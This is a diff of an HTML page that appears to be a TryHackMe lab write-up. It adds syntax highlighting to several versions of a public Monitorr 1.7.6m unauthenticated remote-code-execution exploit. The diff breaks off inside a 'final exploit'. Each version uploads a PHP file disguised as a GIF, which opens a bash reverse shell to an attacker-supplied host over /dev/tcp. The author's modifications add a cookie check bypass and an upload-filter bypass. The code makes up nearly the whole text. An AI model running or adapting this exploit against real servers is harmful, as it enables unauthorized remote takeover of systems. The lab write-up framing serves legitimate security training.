@@ -239,36 +239,36 @@ ff02::2 ip6-allrouters
 <p>If you find any login page for the target website, go ahead and download the <strong>Authorization Bypass</strong>.</p>
 <p>Otherwise download the <strong>Remote Code Execution (Unauthenticated)</strong>.</p>
 <p>Here is the code</p>
-<pre><code>#!/usr/bin/python
-# -*- coding: UTF-8 -*-
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>
+<span class="c1"># -*- coding: UTF-8 -*-</span>
 
-# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
-# Date: September 12, 2020
-# Exploit Author: Lyhin's Lab
-# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
-# Software Link: https://github.com/Monitorr/Monitorr
-# Version: 1.7.6m
-# Tested on: Ubuntu 19
+<span class="c1"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)</span>
+<span class="c1"># Date: September 12, 2020</span>
+<span class="c1"># Exploit Author: Lyhin&#39;s Lab</span>
+<span class="c1"># Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/</span>
+<span class="c1"># Software Link: https://github.com/Monitorr/Monitorr</span>
+<span class="c1"># Version: 1.7.6m</span>
+<span class="c1"># Tested on: Ubuntu 19</span>
 
-import requests
-import os
-import sys
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
 
-if len (sys.argv) != 4:
-	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
-else:
-    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
 
-    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">she_ll.php</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
 
-    requests.post(url, headers=headers, data=data)
+    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 
-    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
-    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
-    requests.get(url, headers=headers)
-</code></pre><p>From the code <code>url = sys.argv[1] + &quot;/assets/php/upload.php&quot;</code>, we get the path where the image gets uploaded.</p>
+    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/data/usrimg/she_ll.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</code></pre></div><p>From the code <code>url = sys.argv[1] + &quot;/assets/php/upload.php&quot;</code>, we get the path where the image gets uploaded.</p>
 <pre><code>ERROR: is not an image or exceeds the webserver’s upload size limit.
 ERROR: ../data/usrimg/ already exists.
 ERROR: was not uploaded.
@@ -334,26 +334,26 @@ requests.exceptions.SSLError: HTTPSConnectionPool(host='monitorr.robyns-petshop.
 <pre><code>r = requests.post(url, headers=headers, data=data)
 print(r.text)
 </code></pre><p>Modified exploit :</p>
-<pre><code>import requests
-import os
-import sys
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
 
-if len (sys.argv) != 4:
-	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
-else:
-    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
 
-    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">she_ll.php</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
 
-    r = requests.post(url, headers=headers, data=data, verify = False) # Modified
-    print(r.text) # Printing the response 
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span> <span class="c1"># Modified</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="c1"># Printing the response </span>
 
-    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
-    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
-    requests.get(url, headers=headers, verify = False)
-</code></pre><blockquote>
+    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/data/usrimg/she_ll.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+</code></pre></div><blockquote>
 <p>Let&rsquo;s run the exploit</p>
 </blockquote>
 <pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py https://monitorr.robyns-petshop.thm/ 10.6.29.240 443
@@ -371,41 +371,41 @@ A shell script should be uploaded. Now we try to execute it
 <p>Check the 🍪 in DevTools</p>
 <p>Found a cookie called <code>isHuman</code> and value set to <code>1</code></p>
 <p>Modified exploit :</p>
-<pre><code>#!/usr/bin/python
-# -*- coding: UTF-8 -*-
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>
+<span class="c1"># -*- coding: UTF-8 -*-</span>
 
-# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
-# Date: September 12, 2020
-# Exploit Author: Lyhin's Lab
-# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
-# Software Link: https://github.com/Monitorr/Monitorr
-# Version: 1.7.6m
-# Tested on: Ubuntu 19
+<span class="c1"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)</span>
+<span class="c1"># Date: September 12, 2020</span>
+<span class="c1"># Exploit Author: Lyhin&#39;s Lab</span>
+<span class="c1"># Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/</span>
+<span class="c1"># Software Link: https://github.com/Monitorr/Monitorr</span>
+<span class="c1"># Version: 1.7.6m</span>
+<span class="c1"># Tested on: Ubuntu 19</span>
 
-import requests
-import os
-import sys
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
 
-if len (sys.argv) != 4:
-	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
-else:
-    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
 
-    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">she_ll.php</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
 
-    cookies = {
-    &quot;isHuman&quot; : &quot;1&quot;,
-    }
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&#34;isHuman&#34;</span> <span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+    <span class="p">}</span>
 
-    r = requests.post(url, headers=headers, data=data,verify=False,cookies = cookies)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
     
 
-    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
-    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
-    requests.get(url, headers=headers, verify=False,cookies = cookies)
-</code></pre><p>Well it worked !!</p>
+    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/data/usrimg/she_ll.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+</code></pre></div><p>Well it worked !!</p>
 <h3 id="filter-bypass">Filter bypass<a href="#filter-bypass" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>Finally we have convinced the Web application that we are human, but it&rsquo;s still not letting us to upload anything.</p>
 <ul>
@@ -417,39 +417,39 @@ else:
 </li>
 </ul>
 <p><strong>This is the final exploit</strong></p>
-<pre><code>import requests
-import os
-import sys
-import random
-import string
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
 
-if len (sys.argv) != 4:
-	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
-else:
-    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, 
-    &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, 
-    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, 
-    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, 
-    &quot;Origin&quot;: sys.argv[1], 
-    &quot;Connection&quot;: &quot;close&quot;, 
